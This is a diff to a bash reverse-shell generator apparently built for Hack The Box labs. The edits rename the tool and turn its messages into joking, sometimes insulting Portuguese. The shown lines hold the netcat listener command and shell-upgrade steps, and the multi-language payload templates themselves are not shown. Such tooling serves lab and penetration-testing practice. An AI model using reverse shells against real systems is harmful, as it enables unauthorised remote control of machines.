@@ -22,16 +22,16 @@ case "$1" in
 	"--install" | "-i")
 		echo -e "instalando..."
 		path="$(pwd)/$0"
-		`/usr/bin/cp ${path} /usr/bin/revshell`
-		`chmod +x /usr/bin/revshell`
+		`/usr/bin/cp ${path} /usr/bin/raspushell`
+		`chmod +x /usr/bin/raspushell`
 		echo -e "${D5}Success!${H0} "
-		echo -e "Run : revshell"
+		echo -e "Run : raspushell"
 		exit ;;
 	#case 2
 	"--help" | "-h")
 		echo -e "Hey! Ja ouviu a palavra do Rasputin hoje?"
-		echo -e "[!] for php --> ph / php or PHP"
-		echo -e "[!] for Python --> py / python or Python"
+		echo -e "[!] Pra php --> ph / php ou PHP"
+		echo -e "[!] Pra Python --> py / python ou Python"
 		exit;;
 esac
 
@@ -39,7 +39,7 @@ esac
 
 tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"
 
-echo -e "${H1}${D1}[!] RevSh3ll for HTB | @HarithDilshan  ${H0}"
+echo -e "${H1}${D1}[!] RA RA RASPUTIN ${H0}"
 echo -e "${H2}${D0}${D4}php :: python :: ruby :: perl :: netcat :: bash ${H0}"
 
 read -p "[+] Select Port [default:5656]: " port
@@ -47,17 +47,17 @@ read -p "[+] Select Port [default:5656]: " port
 if [[ -z $port ]]; then port=5656 ; fi
 if [ $port -gt 65535 ]
 then
-	echo -e "${D5}Hey dude ther are only 65,535 ports!${H0}"
+	echo -e "${D5} Selecione uma das 65,535 portas ou tu vai pra gulag!${H0}"
 	exit
 fi
 if ! [ "$port" -eq "$port" ] 2> /dev/null
 then
-	echo -e "${D5}Hey dude it need to be a VALID port number !!${H0}"
+	echo -e "${D5} Tu tem demencia? Manda uma porta válida !!${H0}"
 	exit	
 fi
 
 
-read -p "[+] Select Language [default:php/ph]: " lang
+read -p "[+] Qual linguagem tu quer? [default:php/ph]: " lang
 
 case "$lang" in 
 	#case 1 
@@ -97,7 +97,7 @@ case "$lang" in
 esac 
 
 echo "" 
-echo -e "[+]${col2}  Listen with:  nc -lvp $port ${H0}"
+echo -e "[+]${col2}  Olha teu netcat aqui:  nc -lvp $port ${H0}"
 echo "" 
 read -p "[+] Quer dar upgrade na shell boladona ? [y/N]: " -n 1 -r
 echo 
@@ -112,7 +112,7 @@ then
 	echo -e "[!] ${col1}->${col2} export TERM=xterm-256color ${H0}"
 	echo -e "[!] ${col1}->${col2} stty rows 38 columns 116 ${H0}"
 	echo -e ""
-	echo -e "[!] Happy Hunting !"
+	echo -e "[!] Welcome comrade !"
 	exit
 fi
 
